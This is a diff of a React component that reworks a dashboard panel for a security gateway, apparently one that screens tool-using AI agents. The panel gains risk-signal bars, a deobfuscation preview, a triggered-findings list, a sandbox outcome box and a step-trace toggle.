-                  <div className="p-3 rounded-xl bg-emerald-500/10 border border-emerald-500/30 mb-4">
-                    <div className="text-xs font-mono text-emerald-300 font-bold">
-                      {runResult.lanes.gateway.records_exposed} records exposed
+                  {/* 4 Live Signal Attribution Bars */}
+                  {runResult.lanes.gateway.risk_breakdown && (
+                    <div
+                      className="p-2.5 rounded-xl bg-black/40 border border-white/10 mb-3 space-y-1.5"
+                      data-testid="gateway-signal-bars"
+                    >
+                      {[
+                        {
+                          label: 'Untrusted Taint',
+                          val: Number(runResult.lanes.gateway.risk_breakdown.untrusted_taint || 0),
+                          max: 38,
+                          bar: 'bg-amber-400',
+                        },
+                        {
+                          label: 'Sensitive Data',
+                          val: Number(runResult.lanes.gateway.risk_breakdown.sensitive_data || 0),
+                          max: 15,
+                          bar: 'bg-purple-400',
+                        },
+                        {
+                          label: 'External Dest',
+                          val: Number(runResult.lanes.gateway.risk_breakdown.external_destination || 0),
+                          max: 25,
+                          bar: 'bg-rose-400',
+                        },
+                        {
+                          label: 'Rule Findings',
+                          val: Number(runResult.lanes.gateway.risk_breakdown.rule_findings || 0),
+                          max: 40,
+                          bar: 'bg-cyan-400',
+                        },
+                      ].map((sig) => {
+                        const pct = Math.min(100, Math.round((sig.val / sig.max) * 100));
+                        return (
+                          <div key={sig.label} className="text-[10px] font-mono">
+                            <div className="flex justify-between text-slate-400 mb-0.5">
+                              <span>{sig.label}</span>
+                              <span className="text-slate-200">{sig.val}</span>
+                            </div>
+                            <div className="h-1.5 rounded-full bg-white/10 overflow-hidden">
+                              <div className={`h-full ${sig.bar} transition-all`} style={{ width: `${pct}%` }} />
+                            </div>
+                          </div>
+                        );
+                      })}
                     </div>
-                    <p className="text-[11px] text-slate-400 mt-0.5">
-                      {runResult.lanes.gateway.decision === 'allow'
-                        ? 'Verified business utility within approved boundaries.'
-                        : 'Halted inline before sensitive database read or exfiltration.'}
-                    </p>
-                  </div>
+                  )}
 
-                  {/* Defense Layer Verdicts Pills */}
-                  {runResult.lanes.gateway.layer_verdicts && (
-                    <div className="mb-3 space-y-1">
-                      <span className="text-[10px] font-mono text-slate-500 block">
-                        Layer Status:
-                      </span>
-                      <div className="flex flex-wrap gap-1.5">
-                        {Object.entries(runResult.lanes.gateway.layer_verdicts).map(([k, v]) => (
-                          <span
-                            key={k}
-                            className="text-[10px] font-mono px-2 py-0.5 rounded bg-white/5 border border-white/10 text-slate-300"
-                          >
-                            {k.replace('_', ' ')}: <b className="text-cyan-300">{v}</b>
-                          </span>
-                        ))}
+                  {/* Deobfuscation / Canonicalization Proof */}
+                  {runResult.lanes.gateway.deobfuscated_preview && (
+                    <div
+                      className="p-2.5 rounded-xl bg-amber-500/10 border border-amber-500/30 mb-3"
+                      data-testid="deobfuscated-proof-box"
+                    >
+                      <div className="text-[10px] font-mono font-bold uppercase tracking-wider text-amber-300 mb-1">
+                        Deobfuscation / Canonicalization Proof
+                      </div>
+                      <div className="text-[11px] font-mono text-amber-100 break-all">
+                        {runResult.lanes.gateway.deobfuscated_preview}
                       </div>
                     </div>
                   )}
 
-                  {/* Reason Callout */}
-                  <div className="text-xs font-mono text-slate-200 p-3 rounded-xl bg-cyan-950/30 border border-cyan-500/30 mb-4">
-                    {runResult.lanes.gateway.reason}
-                  </div>
-                </div>
-
-                {/* Step Trace Toggle */}
-                <div>
-                  <button
-                    type="button"
-                    onClick={() =>
-                      setExpandedTraceLane(expandedTraceLane === 'gateway' ? null : 'gateway')
-                    }
-                    className="text-xs font-mono text-cyan-400 hover:text-cyan-300 flex items-center justify-between w-full pt-3 border-t border-white/10"
-                  >
-                    <span>Inspect Step Trace ({runResult.lanes.gateway.step_trace.length} steps)</span>
-                    <span>{expandedTraceLane === 'gateway' ? '▲' : '▼'}</span>
-                  </button>
-
-                  {expandedTraceLane === 'gateway' && (
-                    <div className="mt-3 space-y-2 pt-2 border-t border-white/5 animate-in fade-in duration-200">
-                      {runResult.lanes.gateway.step_trace.map((st) => (
-                        <div key={st.step} className="text-[11px] font-mono p-2 rounded bg-white/[0.02]">
-                          <div className="text-slate-200 font-semibold">
-                            #{st.step} {st.action} — <span className="text-emerald-400">{st.status}</span>
+                  {/* Triggered Rule Findings */}
+                  {runResult.lanes.gateway.findings && runResult.lanes.gateway.findings.length > 0 && (
+                    <div className="mb-3 space-y-1.5" data-testid="gateway-findings-list">
+                      <span className="text-[10px] font-mono text-slate-500 block">
+                        Triggered Findings ({runResult.lanes.gateway.findings.length}):
+                      </span>
+                      {runResult.lanes.gateway.findings.map((f, idx) => (
+                        <div
+                          key={`${f.name}-${idx}`}
+                          className="p-2 rounded-lg bg-rose-500/10 border border-rose-500/25 text-[10px] font-mono"
+                        >
+                          <div className="flex items-center justify-between gap-1 text-rose-300 font-bold">
+                            <span>{f.name}</span>
+                            <span className="uppercase px-1 rounded bg-rose-500/20">{f.severity}</span>
                           </div>
-                          <div className="text-slate-400 text-[10px] mt-0.5">{st.detail}</div>
+                          <div className="text-slate-300 mt-0.5">{f.evidence}</div>
+                          <div className="text-slate-500 mt-0.5">{f.owasp_category}</div>
                         </div>
                       ))}
                     </div>
                   )}
+
+                  {/* Sandbox Outcome */}
+                  <SandboxOutputBox
+                    output={runResult.lanes.gateway.sandbox_output}
+                    halted={runResult.lanes.gateway.decision !== 'allow'}
+                    label={
+                      runResult.lanes.gateway.decision !== 'allow'
+                        ? 'Execution Halted Inline'
+                        : 'Sandbox Output (Permitted)'
+                    }
+                  />
+
+                  {/* Reason Callout */}
+                  <div className="text-xs font-mono text-slate-200 p-2.5 rounded-xl bg-cyan-950/30 border border-cyan-500/30 mb-3">
+                    {runResult.lanes.gateway.reason}
+                  </div>
                 </div>
+
+                <StepTraceToggle
+                  laneKey="gateway"
+                  steps={runResult.lanes.gateway.step_trace}
+                  expandedTraceLane={expandedTraceLane}
+                  onToggle={(k) => setExpandedTraceLane(expandedTraceLane === k ? null : k)}
+                  statusHighlightClass="text-emerald-400"
+                />
               </div>
             </div>
 
